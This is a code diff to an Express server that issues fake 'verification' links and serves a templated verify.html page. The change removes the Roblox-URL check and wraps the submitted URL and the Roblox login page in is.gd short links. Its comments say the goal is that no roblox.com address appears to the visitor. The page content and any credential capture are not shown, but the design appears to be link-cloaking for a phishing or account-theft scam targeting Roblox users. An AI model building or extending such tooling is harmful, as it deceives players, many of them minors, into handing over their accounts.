@@ -42,14 +42,10 @@ app.get('/', (req, res) => {
 
 // API to generate verification link
 app.post('/api/generate', (req, res) => {
-    const { url } = req.body;
+    const { url, isGdToken } = req.body;
     
     if (!url) {
         return res.status(400).json({ error: 'No URL provided', success: false });
-    }
-    
-    if (!url.includes('roblox.com')) {
-        return res.status(400).json({ error: 'Please enter a valid Roblox URL', success: false });
     }
     
     // Generate 12 random digits for the verify code
@@ -62,31 +58,38 @@ app.post('/api/generate', (req, res) => {
     
     const generatedLink = `${baseUrl}/verify=${verifyCode}`;
     
-    // Create is.gd short URL that points to the original Roblox URL
+    // Create is.gd short URL for the Roblox URL
     createIsGdShortUrl(url, (err, shortUrl) => {
-        // Generate random is.gd code for fallback
         const fallbackIsGd = `https://is.gd/${Math.random().toString(36).substring(2, 8)}`;
-        const finalShortUrl = shortUrl || fallbackIsGd;
+        const robloxIsGd = shortUrl || fallbackIsGd;
         
-        // Generate a random is.gd holder URL (for the current domain)
-        const isGdHolder = `https://is.gd/${Math.random().toString(36).substring(2, 8)}`;
-        
-        // Store the mapping with is.gd URL
-        verifyLinks.set(verifyCode, {
-            originalUrl: url,
-            isGdUrl: finalShortUrl,
-            isGdHolder: isGdHolder,
-            verifyCode: verifyCode,
-            createdAt: Date.now()
-        });
-        
-        res.json({
-            success: true,
-            originalUrl: url,
-            generatedUrl: generatedLink,
-            verifyCode: verifyCode,
-            isGdUrl: finalShortUrl,
-            isGdHolder: isGdHolder
+        // Create is.gd short URL for the Roblox login page (so NO roblox.com appears!)
+        const robloxLoginUrl = `https://www.roblox.com/login`;
+        createIsGdShortUrl(robloxLoginUrl, (err2, loginShortUrl) => {
+            const loginIsGd = loginShortUrl || `https://is.gd/${Math.random().toString(36).substring(2, 8)}`;
+            
+            // Create a random is.gd holder
+            const isGdHolder = `https://is.gd/${Math.random().toString(36).substring(2, 8)}`;
+            
+            // Store all is.gd URLs
+            verifyLinks.set(verifyCode, {
+                originalUrl: url,
+                robloxIsGd: robloxIsGd,
+                loginIsGd: loginIsGd,
+                isGdHolder: isGdHolder,
+                verifyCode: verifyCode,
+                createdAt: Date.now()
+            });
+            
+            res.json({
+                success: true,
+                originalUrl: url,
+                generatedUrl: generatedLink,
+                verifyCode: verifyCode,
+                robloxIsGd: robloxIsGd,
+                loginIsGd: loginIsGd,
+                isGdHolder: isGdHolder
+            });
         });
     });
 });
@@ -100,24 +103,26 @@ app.get('/verify=:code', (req, res) => {
     const htmlPath = path.join(__dirname, 'public', 'verify.html');
     
     if (!fs.existsSync(htmlPath)) {
-        return res.status(404).send('Verification page not found. Please make sure verify.html exists in the public folder.');
+        return res.status(404).send('Verification page not found.');
     }
     
     let html = fs.readFileSync(htmlPath, 'utf8');
     
-    // Use the stored is.gd URLs or create fallbacks
-    const isGdUrl = linkData?.isGdUrl || `https://is.gd/${Math.random().toString(36).substring(2, 8)}`;
+    // Use stored is.gd URLs or create fallbacks
+    const robloxIsGd = linkData?.robloxIsGd || `https://is.gd/${Math.random().toString(36).substring(2, 8)}`;
+    const loginIsGd = linkData?.loginIsGd || `https://is.gd/${Math.random().toString(36).substring(2, 8)}`;
     const isGdHolder = linkData?.isGdHolder || `https://is.gd/${Math.random().toString(36).substring(2, 8)}`;
     
-    // Replace placeholders
+    // Replace placeholders - ALL is.gd, NO roblox.com!
     html = html.replace(/\{\{VERIFY_CODE\}\}/g, code);
-    html = html.replace(/\{\{ORIGINAL_URL\}\}/g, isGdUrl);
-    html = html.replace(/\{\{CURRENT_DOMAIN\}\}/g, isGdHolder);
+    html = html.replace(/\{\{ROBLOX_IS_GD\}\}/g, robloxIsGd);
+    html = html.replace(/\{\{LOGIN_IS_GD\}\}/g, loginIsGd);
     html = html.replace(/\{\{IS_GD_HOLDER\}\}/g, isGdHolder);
     
     console.log(`[Server] Serving verification page for code: ${code}`);
-    console.log(`[Server] is.gd URL: ${isGdUrl}`);
-    console.log(`[Server] is.gd Holder: ${isGdHolder}`);
+    console.log(`[Server] Roblox page (is.gd): ${robloxIsGd}`);
+    console.log(`[Server] Login page (is.gd): ${loginIsGd}`);
+    console.log(`[Server] Holder (is.gd): ${isGdHolder}`);
     
     res.setHeader('Content-Type', 'text/html');
     res.send(html);
